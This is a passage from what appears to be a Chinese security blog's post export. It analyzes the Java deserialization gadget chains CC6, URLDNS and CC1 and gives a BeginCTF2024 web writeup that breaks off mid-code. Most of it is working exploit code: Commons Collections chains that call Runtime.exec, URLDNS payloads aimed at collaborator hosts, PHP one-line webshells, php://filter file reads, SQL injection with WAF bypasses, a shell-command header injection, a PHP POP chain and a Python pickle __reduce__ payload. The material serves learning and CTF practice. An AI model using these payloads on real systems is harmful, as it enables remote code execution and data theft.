HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(hashMap);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject(); 看起来不错，但完成了吗？ 实际上是没有的。我们前边学了URLDNS链可以知道，实际上在给hashMap put的时候就已经触发这条链了，这倒也没关系，只要反序列化的时候能再次触发一遍就好了，但实际上也不行，我们调试一下看看： 可以看到，根本没有进去，这其实是因为之前已经触发过一次，所以innermap中已经存在这个key了。 其实解决方法也很简单，直接在序列化之前删除掉这个key就好了。 直接： 1innerMap.remove(&quot;aaa&quot;); 。。。。。。。。。。。。。。。。。。。。。。。。。。。。 疑惑这里有一个小插曲，本人在复现的时候，并未像网上所说的在hashMap put的时候调用这条链，而是在 1TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;); 这时候就已经触发这条链了。经调试，看起来像是在给key和map赋值的时候连着触发了三次（其实这也很奇怪，因为key居然没有存下来，而是在最后的时候存了下来，使得并没有在put方法中触发链子）。网上有师傅说是IDEA配置的问题，但经过测试，并非是IDEA调试导致的toString等一系列方法的触发。 这个疑惑目前还未解决，但并不妨碍之后链子的触发。 已解决，ytgg也说是IDEA的配置问题，今早打开电脑重新试了一下就成功了，猜测是IDEA的缓存问题，怪事…… 。。。。。。。。。。。。。。。。。。。。。。。。。。。。 再进入正文，我们不想在序列化之前触发这条链，那就需要改一下前边的流程，并在序列化前用反射给改回去，其实改的方法有很多，我们可以改tiedMapEntry，也可以改innermap，还可以改chainedTransformer。我在这里改了chainedTransformer： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);innerMap.remove(&quot;aaa&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(hashMap);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject(); 这样一来，CC6就大功告成了。 后文以上的CC6是白日梦组长讲的版本，和ysoserial中的CC6的差别为最终的readObject方法所属的类。上边讲的是用的HashMap的readObject，ysoserial中用的是HashSet的readObject。改起来也很简单，具体代码如下： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);LinkedHashSet set = new LinkedHashSet();set.add(tiedMapEntry);innerMap.remove(&quot;aaa&quot;);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));oos.writeObject(set);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC6.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVA安全:URLDNS链","slug":"JAVA安全URLDNS链","date":"2024-03-16T11:29:12.456Z","updated":"2024-03-16T12:06:31.739Z","comments":true,"path":"2024/03/16/JAVA安全URLDNS链/","link":"","permalink":"http://example.com/2024/03/16/JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;16 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;16 分类：Vulnerability Analysis 前言URLDNS链是ysoserial中的一条非常经典的链，由于其与jdk版本无关，使用的均为java内置类，常常被用于检测目标是否存在反序列化漏洞，这条链本身是没有什么危害的，仅能发起DNS请求。 正文我们先去ysoserial中看一下这条链的完整流程： 可以看见这条链的流程非常简单，我们就倒着来分析一遍。 1.URL.hashCode()部分为什么要利用URL.hashCode()呢？我们进去看一下： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 可以发现它的hashCode()方法里边调用了URLStreamHandler的hashCode()方法，而URLStreamHandler的hashCode()方法则如下图所示： 可见其将URL传入后调用了getHostAddress()方法，而getHostAddress()方法则会发送DNS请求去查询URL的主机名，如下图所示： 既然如此，我们从终点往上回溯，去看看HashMap如何调用的hashCode()方法。 2.HashMap.hash()部分它这个HashMap很有意思，里边呢接收两个随意的值，一个当KEY，一个当VALUE。我们要找HashMap里调用hashCode()方法的地方，如下： 之后我们再往上找利用HashMap中hash()方法的地方。 3.HashMap.putVal()部分我们可以看到HashMap自身的put()方法中有putVal()方法对hash()方法进行了调用，而该方法则是在readObject()中也有调用： 4.HashMap.readObject()部分因为我们在反序列化的时候会触发readObject()方法，而HashMap则对readObject()方法进行了重写，因此我们可以直接将HashMap进行序列化，然后反序列化触发上述URLDNS链。 5.构造链 仅按上述描述来看的话，我们就能够利用上图中的链进行触发了。但实际上，通过调试可以发现，此时触发这条链的并非反序列化，而是序列化之前的： 1hashMap.put(new URL(&quot;http://d1fq6zzx9q24dt8yandyaqt5awgm4b.burpcollaborator.net&quot;),1); 这个就很有意思了，因为put()方法会直接调用hash()方法，导致这条链正向执行一遍，那么我们在反序列化的时候是否还会触发呢？ 答案是NONONO~~~~ 因为从URL.hashCode()方法中我们可以看到，其私有属性hashCode仅在值为-1的时候会进行执行URLStreamHandler的hashCode()方法，而在正向触发过一次之后，hashCode已经被赋值为其他值了，不能再次触发。那么我们有什么办法使其值在运行过程中改变呢？答案是反射。 反射的引用我们想要这条链在序列化的时候不被触发，而在反序列化的时候触发。那么我们就利用反射，将其在序列化之前，也就是put的时候hashCode赋值为其他，而在序列化前赋值为-1，使其反序列化正好触发。 链子如下： 1234567891011121314HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL,Integer&gt;();URL url = new URL(&quot;http://7ltkbk2jj0pgndcc33oyxbsy1p7fv4.burpcollaborator.net&quot;);Class c = url.getClass();Field hashcode = c.getDeclaredField(&quot;hashCode&quot;);hashcode.setAccessible(true);//针对私有方法必备hashcode.set(url,1);hashMap.put(url,1);hashcode.set(url,-1);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));oos.writeObject(hashMap);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));ois.readObject(); 之后我们便可看到正常的DNS请求了：","categories":[],"tags":[]},{"title":"JAVA安全:CC1链","slug":"JAVA安全CC1链","date":"2024-02-23T09:27:52.423Z","updated":"2024-08-24T03:27:38.444Z","comments":true,"path":"2024/02/23/JAVA安全CC1链/","link":"","permalink":"http://example.com/2024/02/23/JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;23 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;23 分类：Vulnerability Analysis 前言开始之前，我们先了解一下正射和反射。 JAVA中，如果我们要调用起计算器，正常的命令执行为： 1Runtime.getRuntime().exec(&quot;calc&quot;); 但上边使用的是正射，是无法序列化写入文件中的，如果要存入文件，我们需要利用反射来实现： 1234Runtime r = Runtime.getRuntime();//实例化Runtime类Class c = r.getClass();//获取类原型，这里和正射不同，方法从类中获取Method m = c.getMethod(&quot;exec&quot;,String.class);//从类中获取exec方法m.invoke(r,&quot;calc&quot;);//相当于r.exec(&quot;calc&quot;) 所谓的CC链，实际上就是针对Apache Commons Collections组件的payload，其核心便是利用JAVA的反射机制来调用任意函数。 正文针对JAVA的反序列化漏洞，思路大致和php的反序列化漏洞一致，就是从终点往前找，首先确定一个调用了危险方法的类，并且继承了序列化接口，然后逐步溯源，直到找到一个重写了readObject方法的类，并且符合条件，那么就成功了。 下面我们以CC1链为例，进行分析。 1.终点–InvokerTransformer类CC1链的源头便是InvokerTransformer类，关键在于其构造器和继承了Transformer接口的transform方法，我们来看一下它的源码： 123456789101112131415161718192021222324public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125;public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 从构造器中可以得知其三个参数都是可以控制的，而方法transform是不是有点眼熟？没错，这就是在前言中讲到的反射。 我们尝试利用InvokerTransformer类执行之前的命令： 123456 Runtime r = Runtime.getRuntime();// Class c = r.getClass();// Method m = c.getMethod(&quot;exec&quot;,String.class);// m.invoke(r,&quot;calc&quot;);上边这三行注释的代码由下边这两行代替 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(r); 执行上述代码，发现成功弹出计算器。 这样，终点就找到了，我们便需要进行溯源，寻找上一站。 2.溯源2.1 TransformedMap类我们向上找能够利用transform方法的类： 发现有很多，于是便一个个点开查看，最终发现LazyMap，TransformedMap和DefaultedMap存在利用点，我们先只看TransformedMap这个类。 123456789protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;//构造器 super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125;protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);//我们只需要让valueTransformer为InvokerTransformer即可&#125; 然而，TransformerMap的checkSerValue方法以及其构造器都是protected类型的，只能在内部访问，因此我们需要找一个使其实例化的方法，紧接着便看到了TransformedMap中public属性的decorate方法： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 因此我们可以利用TransformedMap类的decorate方法，让其实例化，之后再想办法触发checkSetValue方法。 2.2 Map遍历我们查找调用过checkSetValue方法的地方，发现TransformedMap的父类AbstractInputCheckedMapDecorator恰好调用了该方法，且其中的setValue方法为public类型 1234567891011121314static class MapEntry extends AbstractMapEntryDecorator &#123;//AbstractInputCheckedMapDecorator的副类MapEntry private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 而MapEntry继承了AbstractMapEntryDecorator类，AbstractMapEntryDecorator类中继承了Map.Entry接口，可进行Map遍历 因此我们通过Map遍历时即可调用TransformedMap的父类AbstractInputCheckedMapDecorator中的setValue方法来触发TransformedMap中的checkSetValue方法。 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);for(Map.Entry entry:transformedmap.entrySet())&#123; entry.setValue(r);//相当于InvokerTransformer.transform(r)&#125; 执行上述代码即可弹出计算器，然而，溯源还未结束，我们接着找调用了setValue方法的类。 2.3 起点–AnnotationInvocationHandler类经查找可得： 该类中调用setValue方法的代码如下： 两个if语句，第一个if判断注解中是否有成员变量，第二个if判断是否能够强转。 可见此类中利用的setValue方法恰好写在readObject方法中，只要我们能够控制里边的参数，便可大功告成。 于是我们去找该类的构造器： 12345678910AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; //需要传入两个参数，第一个参数是一个类对象，表示注解的类型；第二个参数需要传入Map，因此传入TransformedMap即可 Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; 接下来第一个参数的构造需要符合这几个if条件，首先，需要是注解类型；其次，内部需要有成员变量，以便在for循环的Map遍历中通过。 像常见的Override注解： 不包含任何成员变量。 因此，我们选用Target注解： 与此同时，更改map.put(“value”,”value”)，使其memberType不为空。 但还有一个问题，那就是AnnotationInvocationHandler类并没有public属性，因此仅能够在sun.reflect.annotation这个包下边调用，因此我们就需要用到反射来实现外部调用。 经过上述溯源，我们成功找到了一条链，接下来我们需要将其以代码形式串联起来。 3.构造链3.1 反射获取Runtime实例Runtime是单例类，且不继承Seralizeable接口，无法在序列化时写入文件，而它的原型类Class则继承了Seralizeable接口，因此我们使用反射获取其原型类。 12345Class rc=Class.forName(&quot;java.lang.Runtime&quot;); //获取类原型Method getRuntime = rc.getDeclaredMethod(&quot;getRuntime&quot;,null);Runtime r = (Runtime) getRuntime.invoke(null,null);Method exec = rc.getDeclaredMethod(&quot;exec&quot;,String.class);exec.invoke(r,&quot;calc&quot;); 这样便可实现序列化，我们采用InvokerTransformer类的transform方法实现上述过程： 1234Class rc = Class.forName(&quot;java.lang.Runtime&quot;);Method getRuntime = (Method)new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;getRuntime&quot;,new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 3.2 使用ChainedTransformer类简化过程1234567891011public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers;&#125;public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; ChainedTransformer类中存在的transform方法类似于递归调用，因此我们可以以数组的形式传入InvokerTransformer类的transform方法实现的获取Runtime实例的过程，故更改代码如下： 1234567Transformer[] transformers=new Transformer[]&#123; new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 然而，在实际的环境中，我们不可能直接调用chainedTransformer的transform方法来传入Runtime.class。因此，我们需要将Runtime.class作为递归的开头传入进去，而直接传入是不可能的，我们需要一个类来作为载体。与此同时，我们还忽略了一个问题，那就是AnnotationInvocationHandler类中的setValue参数不可控。 3.3 ConstantTransformer类的引入先来看一下该类的源码： 12345678public ConstantTransformer(Object constantToReturn) &#123;//构造器 super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;//transform方法 return iConstant;&#125; 该类的transform方法很有意思，无论传入何值，均会返回构造时传入的常量，因此，我们可以直接将Transformer数组改成如下： 123456Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;; 3.4 构造完成完整的CC1链如下所示： 123456789101112131415161718192021Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Target.class,transformedmap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(o);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 成功执行便会弹出计算器： 4.思路转换本次分析的CC1链是国内基于TransformerMap类的链，而我们常用的ysoerial中的则是国外基于LazyMap的链，其思路如下： payload也和之前的类似，不过是将TransformerMap改为了LazyMap，利用方法由checkSetValue变为了get，并多了一步Proxy触发invoke方法，至于注解类型，由于我们利用的是get方法，所以不需要进入if，直接随便传一个注解就可以了。最后使用AnnotationInvocationHandler类进行包装，毕竟我们需要使用它的readObject方法进行反序列化。 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"BeginCTF2024_WEB_WP","slug":"BeginCTF2024_WEB_WP","date":"2024-02-07T03:20:54.991Z","updated":"2024-02-07T03:20:32.243Z","comments":true,"path":"2024/02/07/BeginCTF2024_WEB_WP/","link":"","permalink":"http://example.com/2024/02/07/BeginCTF2024_WEB_WP/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;3 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;3 分类：writeup zupload系列1.这一系列的题目基本上都是考察简单的代码审计，论难度只能算是签到题。 2.所有题目均会先贴出源码。 zupload 本题对action的赋值无过滤，因此可直接读flag，payload:?action=/flag zupload-pro 本题禁止了目录穿越，但限制条件不多，可直接用php伪协议读取文件。 payload:?action=php://filter/convert.base64-encode/resource=/flag base64解码即可：begin{is_tHis_4_wE85heLL_069b22e704f1} zupload-pro-plus 本题做法同上，payload:?action=php://filter/convert.base64-encode/resource=/flag 从源码改动上来看，出题人应该是想让选手进行后缀双写绕过，但应该是出题的时候不严谨，导致有多种做法，因此不再过多赘述 zupload-pro-plus-enhanced 作者在本题进行了加固，只能进行双写后缀的形式绕过 方法如下： 1.一句话木马&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;写入1.php2.改后缀名为1.zip3.上传时拦截数据包改名为1.zip.php4.访问http://ip:port/uploads/1.zip.php zupload-pro-plus-max 本题考点：include()函数包含文件时不考虑文件后缀，并且会将文件内容当作php代码执行 方法如下： 1.创建1.txt里边写上php一句话木马&lt;?php eval(system(&quot;cat /flag&quot;));?&gt;2.压缩为1.zip上传3.访问uploads&#x2F;1.zip，include()函数自动解析1.txt内的内容即可获取&#x2F;flag zupload-pro-plus-max-ultra 本题考点：$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些额外的项目。 $_SERVER[‘PHP_SELF’] 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $SERVER[‘PHP_SELF’] 将得到 &#x2F;test.php&#x2F;foo.bar。__FILE_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 $_SERVER[‘GATEWAY_INTERFACE’] 服务器使用的 CGI 规范的版本；例如，”CGI&#x2F;1.1”。 $_SERVER[‘SERVER_ADDR’] 当前运行脚本所在的服务器的 IP 地址。 $_SERVER[‘SERVER_NAME’] 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.runoob.com) $_SERVER[‘SERVER_SOFTWARE’] 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache&#x2F;2.2.24) $_SERVER[‘SERVER_PROTOCOL’] 请求页面时通信协议的名称和版本。例如，”HTTP&#x2F;1.0”。 $_SERVER[‘REQUEST_METHOD’] 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。 $_SERVER[‘REQUEST_TIME’] 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496) $_SERVER[‘QUERY_STRING’] query string（查询字符串），如果有的话，通过它进行页面访问。 $_SERVER[‘HTTP_ACCEPT’] 当前请求头中 Accept: 项的内容，如果存在的话。 $_SERVER[‘HTTP_ACCEPT_CHARSET’] 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。 $_SERVER[‘HTTP_HOST’] 当前请求头中 Host: 项的内容，如果存在的话。 $_SERVER[‘HTTP_REFERER’] 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。) $_SERVER[‘HTTPS’] 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。 $_SERVER[‘REMOTE_ADDR’] 浏览当前页面的用户的 IP 地址。 $_SERVER[‘REMOTE_HOST’] 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。 $_SERVER[‘REMOTE_PORT’] 用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[‘SCRIPT_FILENAME’] 当前执行脚本的绝对路径。 $_SERVER[‘SERVER_ADMIN’] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：&#115;&#x6f;&#109;&#101;&#111;&#110;&#101;&#x40;&#x72;&#117;&#x6e;&#111;&#111;&#x62;&#46;&#99;&#111;&#x6d;) $_SERVER[‘SERVER_PORT’] Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 $_SERVER[‘SERVER_SIGNATURE’] 包含了服务器版本和虚拟主机名的字符串。 $_SERVER[‘PATH_TRANSLATED’] 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 $_SERVER[‘SCRIPT_NAME’] 包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本(例如包含文件)的完整路径和文件名。 $_SERVER[‘SCRIPT_URI’] URI 用来指定要访问的页面。例如 “&#x2F;index.html”。 （以上内容均来自菜鸟：PHP 超级全局变量 | 菜鸟教程 (runoob.com)） 方法如下： 1.burp抓包，在http头中添加X-Extract-To:.;cp &#x2F;flag . &#x2F;uploads&#x2F; 2.访问http://ip:port/uploads/flag zupload-pro-plus-max-ultra-premium 本题考点：软链接 软链接可以看成是Windows系统中的快捷方式，可以让你快速链接到目标文件或目录，它找到的是原文件名，通过原文件名找到真实的文件或目录，且软连接本身有自己的indoe 方法如下： 1.ln -s &#x2F;flag flag创建软连接文件 2.将文件压缩为zip格式上传 3.访问&#x2F;uploads&#x2F;flag即可访问到&#x2F;flag zupload-pro-revenge 本题考点：前端校验绕过（PS：任何前端校验都是不可信的） 方法如下： 1.一句话木马&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;写入1.php2.改后缀名为1.zip3.上传时拦截数据包改名为1.php4.访问http://ip:port/uploads/1.php sql教学局单纯的sql waf绕过，没什么技术含量 flag分为三部分，依次拿就是了 payload如下： 1231.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(flag)/**/frfromom/**/secret.passwoorrd%232.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(student,%27~%27,grade)/**/frfromom/**/scoorre/**/where/**/student/**/like/**/%27begin%27%233.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/loloadad_file(&#x27;/flag&#x27;)%23 POPgadget考察php反序列化，这个题目有点坑人，flag在环境变量中，直接看phpinfo就可以了，耗费了很多时间 POP链构造：B::__destruct到A::__get到Fun::__call 别忘了将空字符改成%00，之后GET传参：?begin=O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125; PS：后来才知道，这个phpinfo是个非预期，真正的解法实际上是把phpinfo改成env直接看环境变量（其实也差不多） pickelshop新知识点：考察pickel反序列化 register页面注册获取cookie，在login页面的http头中添加cookie会发现回显 因此在username中添加__reduce__函数进行命令执行 1234567891011121314151617181920import pickleimport base64class register(object): def __init__(self, username=&quot;test&quot;): self.username = username def __reduce__(self): return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))a = &#123;&#x27;username&#x27;: register(), &#x27;password&#x27;: &#x27;124&#x27;&#125;c = pickle.dumps(a, protocol=4)encoded_data = 